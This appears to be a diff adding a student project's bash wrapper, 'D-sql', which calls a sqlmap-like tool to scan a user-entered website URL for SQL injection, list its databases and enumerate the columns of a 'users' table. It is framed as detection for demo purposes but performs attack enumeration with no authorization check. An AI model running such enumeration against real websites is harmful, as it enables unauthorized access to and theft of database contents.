@@ -1,0 +1,86 @@
+#!/bin/bash 
+#done by Faisal And mohammed for Btech-project 
+sleep 2
+clear
+echo " "
+echo -e "\e[107m" 
+echo ".--------------------------------------------- "
+sleep 1 
+echo -e  "\e[0m" 
+echo " .----------------------------------------- " 
+sleep 1 
+echo " |  .------------------------------------- " 
+sleep 1 
+echo " | | .---------------------------------- " 
+sleep 1 
+echo " | | | .--------------------------- "
+sleep 1 
+echo " | | | | .-------------------- " 
+sleep 2 
+toilet --gay D-sql 
+echo " " 
+sleep 2 
+echo -e "\e[4m" 
+echo -e "\e[1m"
+echo -e " for demo purpose only " 
+echo -e " Done by Faisal and Mohammed " 
+echo -e "\e[0m" 
+echo " " 
+sleep 2 
+echo " "
+echo "are you ready to detect SQL ? "
+echo -e "\e[0m"
+echo " " 
+sleep 2
+echo "if yes enter the URL of the infected website "
+echo "if no enter E to exit"
+read url 
+             until [ "$url" = "E" ]
+do 
+sleep 2
+clear 
+echo " "
+echo -e "\e[1m"
+echo " Let's start " 
+echo -e "\e[0m"
+echo " " 
+sleep 2 
+
+
+echo "first we will start by easy scanning on the website"
+echo " "
+sleep 5
+python /var/www/html/sql/dsql -u "$url"
+echo " "
+sleep 5
+
+
+echo "first we will list all database at the site "
+echo " "
+sleep 4
+python  /var/www/html/sql/dsql  -u "$url" --dbs 
+echo " "
+sleep 5 
+
+
+echo "now we will try to list all columns in table"
+echo " "
+sleep 3
+read D 
+             until [ "$D" = "E" ]
+do 
+sleep 2
+
+
+python  /var/www/html/sql/dsql -u "$url" -D $D --tables site_db -T users --columns
+sleep 5
+echo " "
+echo " "
+echo " "
+
+
+done
+done
+exit
+
+
